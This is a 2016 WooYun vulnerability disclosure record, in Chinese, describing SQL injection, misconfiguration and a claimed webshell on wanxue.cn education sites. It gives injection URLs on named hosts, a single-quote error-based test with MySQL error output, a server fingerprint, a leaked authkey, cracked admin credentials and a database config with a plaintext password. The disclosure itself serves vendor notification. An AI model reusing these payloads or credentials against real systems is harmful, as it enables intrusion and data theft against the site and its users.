{"id": 75122, "wybug_id": "wooyun-2016-0168471", "wybug_title": "万学教育课堂站点全过程(多处SQL注射++配置不当+漫游后台导致Getshell)", "wybug_corp": "wanxue.cn", "wybug_author": "imp0rt", "wybug_date": "2016-01-08 17:41", "wybug_open_date": "2016-02-22 16:48", "wybug_type": "成功的入侵事件", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-08：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-01-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-22：\t细节向公众公开  简要描述： 求rank。。。 详细说明：  配置不当 多处注入 信息泄漏 导致getshell 可内网漫游   漏洞证明：  目标站点:www.wanxue.cngwy.wanxue.cntest:authkey:7uiffp16oiqrbqevsclkct6y0cv5r435主站路径:http://www.wanxue.cn/admin_wanxue//home/wwwroot/inc/config.php可本地构造authkey注入注入点:http://gwy.wanxue.cn/index.php?m=content&c=index&a=cw_list&course_type=1http://gwy.wanxue.cn/index.php?m=content&c=index&a=show_ptxcvedio&id=185 id=185 http://kaoyan.wanxue.cn/index.php?m=content&c=index&a=lists&catid=496&pc_hash=A2Qxwd catid=496 test:http://gwy.wanxue.cn/index.php?m=content&c=index&a=cw_list&course_type=1%27加单引号爆错\nMySQL Query : SELECT COUNT(*) AS num FROM `gwy`.`gwy_product` WHERE course_type=1\\' and issale=1 LIMIT 1 MySQL Error : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\\' and issale=1 LIMIT 1' at line 1 MySQL Errno : 1064 Message : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\\' and issale=1 LIMIT 1' at line 1 Need Help?\n得到表前缀:gwy_xxx\nTarget: \t\thttp://gwy.wanxue.cn/index.php?m=content&c=index&a=cw_list&course_type=1Host IP:\t\t124.207.57.250Web Server: \tnginx/1.7.3Powered-by: \tPHP/5.4.8DB Server: \tMySQLCurrent DB: \tgwy\n\n\n通过MD5解密为username:admin password:Adminadmin\n\n\n\n\n\n内网流可继续哈。。。数据库信息:\n<?phpreturn array (\t'default' => array (\t\t'hostname' => 'localhost',\t\t'database' => 'gwy',\t\t'username' => 'gwy',\t\t'password' => 'wanxue@#$234gwy',\t\t'tablepre' => 'gwy_',\t\t'charset' => 'utf8',\t\t'type' => 'mysql',\t\t'debug' => true,\t\t'pconnect' => 0,\t\t'autoconnect' => 0\t\t),);?>\nshell已拿。。。不深入测试。。。   修复方案：  你们比我懂。。。   版权声明：转载请注明来源 imp0rt@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2016-01-08 17:56 厂商回复： 感谢您的反馈，我们会尽快处理 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}